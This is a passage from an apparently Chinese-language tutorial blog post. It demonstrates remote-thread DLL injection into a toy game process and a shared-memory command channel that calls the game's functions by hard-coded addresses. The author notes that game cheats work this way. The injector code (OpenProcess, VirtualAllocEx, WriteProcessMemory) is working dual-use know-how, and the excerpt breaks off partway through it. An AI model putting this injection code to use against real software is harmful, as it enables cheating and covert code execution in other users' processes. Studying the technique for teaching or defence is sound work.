string\">\"**********传送**********\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">char</span> cOrder<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"**********Game Begin**********\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tcOrder <span class=\"token operator\">=</span> <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>cOrder<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token string\">'R'</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t\t<span class=\"token function\">recover</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token string\">'S'</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t\t<span class=\"token function\">seckill</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token string\">'T'</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t\t<span class=\"token function\">teleport</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>效果图</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>人可以控制它的执行，那么我们可不可以通过别的程序控制它的执行呢？</p>\n<h2 id=\"基本思路\"><a class=\"anchor\" href=\"#基本思路\">#</a> 基本思路</h2>\n<p>Dll 加载后会创建一个新线程，这个线程会实现我们控制程序的基本功能，为了能够实现 “控制”，我们还需要一个 “控制台” 的程序，首先这个控制台程序能够把 Dll 注入进 Game 进程中，那么，如何进行控制呢，我们可以在 Dll 创建的线程中实现共享内存映射，使得这块内存既可以被 Dll 访问也可以被 “控制台” 访问，具体为 “控制台程序写入命令，dll 线程读取命令，以这块共享内存进行通信，最后还有一个重要的事情，那就是结束通信卸载 dll。</p>\n<p>具体化为：</p>\n<ol>\n<li>通过 dll 注入的方式将代码加载进目标进程</li>\n<li>通过共享内存的方式进行数据通信 (共享物理页)</li>\n<li>通过循环读取命令队列，并通过内联汇编的方式调用各种函数</li>\n</ol>\n<p>一些外挂（辅助）的原理也是这样。</p>\n<h2 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h2>\n<p>想清楚原理后，我们用代码来实现逻辑。</p>\n<p>DLL 文件</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">///dllmain.cpp : 定义 DLL 应用程序的入口点。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"pch.h\"</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_MAP_</span> <span class=\"token expression\">L</span><span class=\"token string\">\"内存共享\"</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 函数地址</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">RECOVER</span>  <span class=\"token expression\"><span class=\"token number\">0x00411790</span></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">SEECKILL</span> <span class=\"token expression\"><span class=\"token number\">0x004117F0</span></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TELEPORT</span> <span class=\"token expression\"><span class=\"token number\">0x00411850</span></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>HANDLE g_hModule<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>HANDLE g_hMapFile<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>LPTSTR lpBuff<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>DWORD dwType<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>DWORD WINAPI <span class=\"token function\">ThreadProc</span><span class=\"token punctuation\">(</span>LPVOID lpParameter<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token function\">MessageBox</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"DllInject\"</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"Or0kit\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tdwType <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token comment\">// 打开共享内存</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tg_hMapFile <span class=\"token operator\">=</span> <span class=\"token function\">OpenFileMapping</span><span class=\"token punctuation\">(</span>FILE_MAP_ALL_ACCESS<span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">,</span> _MAP_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>g_hMapFile <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"OpenFileMapping Error: %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token comment\">// 映射内存</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\tlpBuff <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>LPTSTR<span class=\"token punctuation\">)</span><span class=\"token function\">MapViewOfFile</span><span class=\"token punctuation\">(</span>g_hMapFile<span class=\"token punctuation\">,</span> FILE_MAP_ALL_ACCESS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> BUFSIZ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lpBuff <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token function\">CopyMemory</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>dwType<span class=\"token punctuation\">,</span> lpBuff<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dwType <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t__asm <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t\tmov eax<span class=\"token punctuation\">,</span> RECOVER</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t\tcall eax</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\tdwType <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t<span class=\"token function\">CopyMemory</span><span class=\"token punctuation\">(</span>lpBuff<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>dwType<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dwType <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t__asm <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t\tmov eax<span class=\"token punctuation\">,</span> SEECKILL</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\t\tcall eax</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t\tdwType <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t\t<span class=\"token function\">CopyMemory</span><span class=\"token punctuation\">(</span>lpBuff<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>dwType<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dwType <span class=\"token operator\">==</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t\t__asm <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\t\t\tmov eax<span class=\"token punctuation\">,</span> TELEPORT</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t\t\tcall eax</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t\tdwType <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\t\t<span class=\"token function\">CopyMemory</span><span class=\"token punctuation\">(</span>lpBuff<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>dwType<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dwType <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t\t\t<span class=\"token function\">FreeLibraryAndExitThread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>HMODULE<span class=\"token punctuation\">)</span>g_hModule<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t\t<span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">600</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>BOOL APIENTRY <span class=\"token function\">DllMain</span><span class=\"token punctuation\">(</span>HANDLE hModule<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\tDWORD  ul_reason_for_call<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\tLPVOID lpReserved</pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>ul_reason_for_call<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t<span class=\"token keyword\">case</span> DLL_PROCESS_ATTACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t\t<span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPTHREAD_START_ROUTINE<span class=\"token punctuation\">)</span>ThreadProc<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t<span class=\"token keyword\">case</span> DLL_THREAD_ATTACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token keyword\">case</span> DLL_THREAD_DETACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t<span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>“控制台”</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;TlHelp32.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;tchar.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_MAP_</span> <span class=\"token expression\">L</span><span class=\"token string\">\"内存共享\"</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>LPTSTR lpBuff<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// 获取进程 name 的 ID</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>DWORD <span class=\"token function\">getPid</span><span class=\"token punctuation\">(</span>LPTSTR name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    HANDLE hProcSnap <span class=\"token operator\">=</span> <span class=\"token function\">CreateToolhelp32Snapshot</span><span class=\"token punctuation\">(</span>TH32CS_SNAPPROCESS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取进程快照句柄</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>hProcSnap <span class=\"token operator\">!=</span> INVALID_HANDLE_VALUE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    PROCESSENTRY32 pe32<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    pe32<span class=\"token punctuation\">.</span>dwSize <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>PROCESSENTRY32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    BOOL flag <span class=\"token operator\">=</span> <span class=\"token function\">Process32First</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取列表的第一个进程</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">_tcscmp</span><span class=\"token punctuation\">(</span>pe32<span class=\"token punctuation\">.</span>szExeFile<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">return</span> pe32<span class=\"token punctuation\">.</span>th32ProcessID<span class=\"token punctuation\">;</span><span class=\"token comment\">//pid</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        flag <span class=\"token operator\">=</span> <span class=\"token function\">Process32Next</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取下一个进程</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">// 远程线程注入</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token function\">RemoteThreadInject</span><span class=\"token punctuation\">(</span>LPTSTR ProcName<span class=\"token punctuation\">,</span> LPCWSTR DllPath<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    DWORD dwPid <span class=\"token operator\">=</span> <span class=\"token function\">getPid</span><span class=\"token punctuation\">(</span>ProcName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\">//1. 使用 PID 打开进程获取权限</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    HANDLE hProcess <span class=\"token operator\">=</span> <span class=\"token function\">OpenProcess</span><span class=\"token punctuation\">(</span>PROCESS_ALL_ACCESS<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> dwPid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token comment\">//2. 申请内存，写入 DLL 路径</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">int</span> nLen <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>WCHAR<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token function\">lstrlen</span><span class=\"token punctuation\">(</span>DllPath<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    LPVOID pBuf <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAllocEx</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> nLen<span class=\"token punctuation\">,</span> MEM_RESERVE <span class=\"token operator\">|</span> MEM_COMMIT<span class=\"token punctuation\">,</span> PAGE_READWRITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>pBuf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"申请内存失败！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\">//3. 写入内存</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    DWORD dwWrite <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">WriteProcessMemory</span><span class=\"token 